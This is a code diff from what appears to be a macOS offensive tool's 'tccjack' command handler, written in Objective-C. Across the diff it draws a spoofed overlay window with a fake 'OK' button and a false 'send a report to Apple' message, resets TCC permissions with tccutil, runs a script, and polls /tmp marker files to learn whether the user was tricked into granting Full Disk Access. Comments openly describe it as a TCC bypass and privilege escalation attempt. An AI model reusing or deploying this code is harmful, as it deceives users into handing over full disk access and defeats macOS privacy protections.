-        [descLabel setBezeled:NO];
-        [descLabel setEditable:NO];
-        [descLabel setFont:[NSFont systemFontOfSize:15]];
-        [descLabel setBackgroundColor:[NSColor clearColor]];
-        [descLabel setFrame:NSMakeRect(42, -40, 220, 200)];
-        [descLabel setStringValue:@"Click OK to see more detailed information and send a report to Apple."];
-        [contentView addSubview:descLabel];
-        
-        // Create fake OK button
-        TCCJACK_LOG(@"Creating OK button");
-        NSButton *okButton = [[[NSButton alloc] init] autorelease];
-        [okButton setTitle:@"OK"];
-        
-        // Check if we can access the layer property
-        TCCJACK_LOG(@"Setting button layer properties");
-        if ([okButton respondsToSelector:@selector(setWantsLayer:)]) {
-            [okButton setWantsLayer:YES];
-            
-            if (okButton.layer) {
-                [okButton.layer setBorderWidth:0];
-                [okButton.layer setCornerRadius:10];
-            } else {
-                TCCJACK_LOG(@"WARNING: Button layer is nil");
-            }
-        } else {
-            TCCJACK_LOG(@"WARNING: Button does not respond to setWantsLayer:");
-        }
-        
-        [okButton setAlignment:NSTextAlignmentCenter];
-        [okButton setFont:[NSFont systemFontOfSize:14]];
-        [okButton setFrame:NSMakeRect(154, 36, 110, 30)];
-        [contentView addSubview:okButton];
-        
-        // Set up a timer to check for TCC response
-        NSTimer *checkTimer = [NSTimer scheduledTimerWithTimeInterval:0.1 // Check every 100ms
-                                                             target:self
-                                                           selector:@selector(checkTCCResponse:)
-                                                           userInfo:nil
-                                                            repeats:YES];
-        
-        // Store timer as associated object so it's retained
-        objc_setAssociatedObject(self, "tcc_check_timer", checkTimer, OBJC_ASSOCIATION_RETAIN);
-        
-        TCCJACK_LOG(@"Set up TCC response check timer: %@", checkTimer);
-        
-        // Show the window
-        TCCJACK_LOG(@"Making window key and ordering front");
-        [_overlayWindow makeKeyAndOrderFront:nil];
-        TCCJACK_LOG(@"Window successfully displayed");
-    } @catch (NSException *exception) {
-        TCCJACK_LOG(@"ERROR: Exception during window creation: %@", exception);
+    if (_scriptPath) {
+        [[NSFileManager defaultManager] removeItemAtPath:_scriptPath error:nil];
+        [_scriptPath release];
+        _scriptPath = nil;
     }
 }
 
-- (void)checkTCCResponse:(NSTimer *)timer {
-    // Run everything on the main thread to avoid synchronization issues
+@end
+
+@implementation ZTCCJackPermissionManager
+
+/** Reset TCC permissions to force new prompt */
++ (BOOL)resetTCCPermissionsWithError:(NSError **)error {
+    @try {
+        NSTask *task = [[[NSTask alloc] init] autorelease];
+        [task setLaunchPath:@"/usr/bin/tccutil"];
+        [task setArguments:@[@"reset", @"AppleEvents"]];
+        [task launch];
+        [task waitUntilExit];
+        
+        if ([task terminationStatus] != 0) {
+            if (error) {
+                *error = [NSError errorWithDomain:ZTCCJackErrorDomain
+                                           code:ZTCCJackErrorCodePermissionResetFailed
+                                       userInfo:@{NSLocalizedDescriptionKey: @"Failed to reset TCC permissions"}];
+            }
+            return NO;
+        }
+        return YES;
+    } @catch (NSException *exception) {
+        if (error) {
+            *error = [NSError errorWithDomain:ZTCCJackErrorDomain
+                                       code:ZTCCJackErrorCodePermissionResetFailed
+                                   userInfo:@{NSLocalizedDescriptionKey: [exception reason]}];
+        }
+        return NO;
+    }
+}
+
+/** Check for successful elevation marker */
++ (BOOL)checkForSuccessMarker {
+    return [[NSFileManager defaultManager] fileExistsAtPath:@"/tmp/tccjack_success"];
+}
+
+/** Check for failed elevation marker */
++ (BOOL)checkForFailureMarker {
+    return [[NSFileManager defaultManager] fileExistsAtPath:@"/tmp/tccjack_failure"];
+}
+
+/** Retrieve detailed failure message */
++ (NSString *)failureMessage {
+    NSError *error = nil;
+    NSString *content = [NSString stringWithContentsOfFile:@"/tmp/tccjack_failure"
+                                                encoding:NSUTF8StringEncoding
+                                                   error:&error];
+    return content ?: @"Full Disk Access was denied";
+}
+
+/** Clean up all marker files */
++ (void)cleanupMarkerFiles {
+    NSFileManager *fileManager = [NSFileManager defaultManager];
+    [fileManager removeItemAtPath:@"/tmp/tccjack_success" error:nil];
+    [fileManager removeItemAtPath:@"/tmp/tccjack_failure" error:nil];
+}
+
+@end
+
+@implementation ZTCCJackCommandHandler
+
+/**
+ * Initializes the TCC bypass command handler.
+ * Sets up all necessary components for privilege escalation attempt.
+ *
+ * Security Notes:
+ * - Creates isolated work queue
+ * - Initializes components with proper memory management
+ * - Maintains clean initial state
+ *
+ * @return Initialized command handler
+ */
+- (instancetype)init {
+    self = [super initWithType:@"tccjack"];
+    if (self) {
+        _dialogHandler = [[ZDialogCommandHandler alloc] init];
+        _tccPromptTriggered = NO;
+        _workQueue = dispatch_queue_create("com.tccjack.workqueue", DISPATCH_QUEUE_SERIAL);
+        _scriptManager = [[ZTCCJackScriptManager alloc] init];
+        _windowController = nil;
+    }
+    return self;
+}
+
+/**
+ * Performs thorough cleanup of all resources.
+ * Critical for preventing memory leaks and maintaining security.
+ */
+- (void)dealloc {
+    [_dialogHandler release];
+    [_windowController release];
+    [_scriptManager release];
+    [_commandCompletion release];
+    dispatch_release(_workQueue);
+    [super dealloc];
+}
+
+/**
+ * Primary entry point for TCC bypass operation.
+ * Orchestrates the complete privilege escalation attempt:
+ * 1. Sets up spoofed UI
+ * 2. Resets TCC permissions
+ * 3. Executes privileged operation
+ * 4. Monitors results
+ *
+ * Security Notes:
+ * - Implements proper thread safety
+ * - Handles all error cases
+ * - Cleans up resources in all paths
+ * - Prevents memory leaks
+ *
+ * @param command Command model containing operation parameters
+ * @param completion Block called with operation results
+ */
+- (void)executeCommand:(ZCommandModel *)command 
+           completion:(void (^)(BOOL success, NSDictionary *result, NSError *error))completion {
+    // Store completion handler
+    self.commandCompletion = completion;
+    
     dispatch_async(dispatch_get_main_queue(), ^{
-        TCCJACK_LOG(@"Checking TCC response on main thread: %@", [NSThread currentThread]);
-        
-        NSFileManager *fileManager = [NSFileManager defaultManager];
-        BOOL success = [fileManager fileExistsAtPath:@"/tmp/tccjack_success"];
-        BOOL failure = [fileManager fileExistsAtPath:@"/tmp/tccjack_failure"];
-        
-        if (success || failure) {
-            TCCJACK_LOG(@"TCC response detected - Success: %d, Failure: %d", success, failure);
+        @try {
+            // Setup application
+            [self ensureApplicationSetup];
             
-            // Invalidate and clear timer first
-            if ([timer isValid]) {
-                TCCJACK_LOG(@"Invalidating timer: %@", timer);
-                [timer invalidate];
-            }
-            objc_setAssociatedObject(self, "tcc_check_timer", nil, OBJC_ASSOCIATION_RETAIN);
+            // Create and show window
+            _windowController = [[ZTCCJackWindowController alloc] initWithScreen:[NSScreen mainScreen]];
+            __block typeof(self) weakSelf = self;
+            _windowController.responseHandler = ^(BOOL success, NSString *message) {
+                [weakSelf handleTCCResponse:success message:message];
+            };
+            [_windowController showWindow];
             
-            // Clean up marker files
-            [fileManager removeItemAtPath:@"/tmp/tccjack_success" error:nil];
-            [fileManager removeItemAtPath:@"/tmp/tccjack_failure" error:nil];
-            TCCJACK_LOG(@"Cleaned up marker files");
-            
-            // Create result dictionary
-            NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
-            [result setObject:@"tccjack_response" forKey:@"type"];
-            [result setObject:(success ? @"success" : @"failed") forKey:@"status"];
-            [result setObject:(success ? @"Full Disk Access was granted" : @"Full Disk Access was denied") forKey:@"message"];
-            TCCJACK_LOG(@"Created result dictionary: %@", result);
-            
-            // Get and clear completion block
-            void (^savedCompletion)(BOOL, NSDictionary*, NSError*) = objc_getAssociatedObject(self, "completion_block");
-            objc_setAssociatedObject(self, "completion_block", nil, OBJC_ASSOCIATION_COPY);
-            TCCJACK_LOG(@"Retrieved and cleared completion block: %p", savedCompletion);
-            
-            // Clean up window first
-            if (_overlayWindow) {
-                TCCJACK_LOG(@"Starting window cleanup. Current window: %@", _overlayWindow);
-                NSWindow *windowToClose = _overlayWindow;
-                _overlayWindow = nil;
-                [windowToClose close];
-                [windowToClose release];
-                TCCJACK_LOG(@"Window cleanup complete");
+            // Reset permissions
+            NSError *resetError = nil;
+            if (![ZTCCJackPermissionManager resetTCCPermissionsWithError:&resetError]) {
+                [self handleError:resetError];
+                return;
             }
             
-            // Set flag after window cleanup
-            _tccPromptTriggered = YES;
-            TCCJACK_LOG(@"Set tccPromptTriggered to YES");
+            // Create and execute script
+            NSError *scriptError = nil;
+            if (![_scriptManager createScriptWithError:&scriptError]) {
+                [self handleError:scriptError];
+                return;
+            }
             
-            // Call completion last, after all cleanup is done
-            if (savedCompletion) {
-                TCCJACK_LOG(@"Calling completion block with result");
-                @try {
-                    savedCompletion(YES, result, nil);
-                    TCCJACK_LOG(@"Completion block called successfully");
-                } @catch (NSException *exception) {
-                    TCCJACK_LOG(@"ERROR: Exception during completion block execution: %@", exception);
+            _scriptManager.completionHandler = ^(BOOL success, NSError *error) {
+                if (!success) {
+                    [weakSelf handleError:error];
+                    return;
                 }
-            }
+                
+                // Start checking for response
+                [weakSelf->_windowController startResponseChecking];
+                
+                // Set timeout
+                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kTCCJackTimeout * NSEC_PER_SEC)),
+                             dispatch_get_main_queue(), ^{
+                    if (!weakSelf->_tccPromptTriggered) {
+                        NSError *timeoutError = [NSError errorWithDomain:ZTCCJackErrorDomain
+                                                                  code:ZTCCJackErrorCodeTimeout
+                                                              userInfo:@{NSLocalizedDescriptionKey: @"TCC prompt did not appear"}];
+                        [weakSelf handleError:timeoutError];
+                    }
+                });
+            };
             
-            [result release];
-            TCCJACK_LOG(@"Cleanup complete");
+            [_scriptManager executeScript];
+            
+        } @catch (NSException *exception) {
+            NSError *error = [NSError errorWithDomain:ZTCCJackErrorDomain
+                                               code:ZTCCJackErrorCodeScriptExecutionFailed
+                                           userInfo:@{NSLocalizedDescriptionKey: [exception reason]}];
+            [self handleError:error];
         }
     });
 }
 
-- (void)ensureApplicationSetup {
-    TCCJACK_LOG(@"Ensuring application is properly set up for UI, isMainThread: %d", [NSThread isMainThread]);
+/**
+ * Handles TCC prompt response and cleanup.
+ * Processes user interaction results and ensures proper resource cleanup.
+ *
+ * Security Notes:
+ * - Sets operation state flags
+ * - Creates sanitized result dictionary
+ * - Implements proper cleanup sequence
+ * - Maintains thread safety
+ *
+ * @param success Whether TCC access was granted
+ * @param message Detailed result message
+ */
+- (void)handleTCCResponse:(BOOL)success message:(NSString *)message {
+    _tccPromptTriggered = YES;
     
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    [result setObject:@"tccjack_response" forKey:@"type"];
+    [result setObject:(success ? @"success" : @"failed") forKey:@"status"];
+    [result setObject:message forKey:@"message"];
+    
+    // Cleanup
+    [_windowController closeWindow];
+    [_scriptManager cleanup];
+    
+    // Call completion
+    if (self.commandCompletion) {
+        self.commandCompletion(success, result, nil);
+    }
+}
+
+/**
+ * Handles errors during TCC bypass attempt.
+ * Provides detailed error reporting while preventing information leakage.
+ *
+ * Security Notes:
+ * - Creates sanitized error dictionary
+ * - Implements proper cleanup sequence
+ * - Maintains thread safety
+ * - Prevents sensitive data exposure
+ *
+ * @param error The NSError object containing error details
+ */
+- (void)handleError:(NSError *)error {
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    [result setObject:@"tccjack_response" forKey:@"type"];
+    [result setObject:@"failed" forKey:@"status"];
+    [result setObject:[error localizedDescription] forKey:@"message"];
+    
+    // Cleanup
+    [_windowController closeWindow];
+    [_scriptManager cleanup];
+    
+    // Call completion
+    if (self.commandCompletion) {
+        self.commandCompletion(NO, result, error);
+    }
+}
+
+/**
+ * Ensures proper application setup for UI presentation.
+ * Configures application for secure window management.
+ *
+ * Security Notes:
+ * - Enforces main thread execution
+ * - Configures minimal application presence
+ * - Maintains UI security context
+ *
+ * @throws NSInternalInconsistencyException if not called from main thread
+ */
+- (void)ensureApplicationSetup {
     if (![NSThread isMainThread]) {
-        TCCJACK_LOG(@"ERROR: ensureApplicationSetup must be called from main thread!");
-        return;
+        [NSException raise:NSInternalInconsistencyException
+                    format:@"ensureApplicationSetup must be called from main thread"];
     }
     
-    // Create shared application if needed
-    TCCJACK_LOG(@"Creating shared application");
     NSApplication *app = [NSApplication sharedApplication];
-    TCCJACK_LOG(@"Shared application: %@", app);
-    
-    // Make sure the app is properly activated
     if (![NSApp isRunning]) {
-        TCCJACK_LOG(@"Initializing NSApp");
-        // Use Accessory policy to avoid dock icon
         [NSApp setActivationPolicy:NSApplicationActivationPolicyAccessory];
         [NSApp finishLaunching];
-        TCCJACK_LOG(@"NSApp initialized and finished launching");
-    } else {
-        TCCJACK_LOG(@"NSApp is already running");
     }
-    
-    // Ensure the app is activated
-    TCCJACK_LOG(@"Activating app ignoring other apps");
     [NSApp activateIgnoringOtherApps:YES];
-    TCCJACK_LOG(@"App activated");
 }
 
 @end 
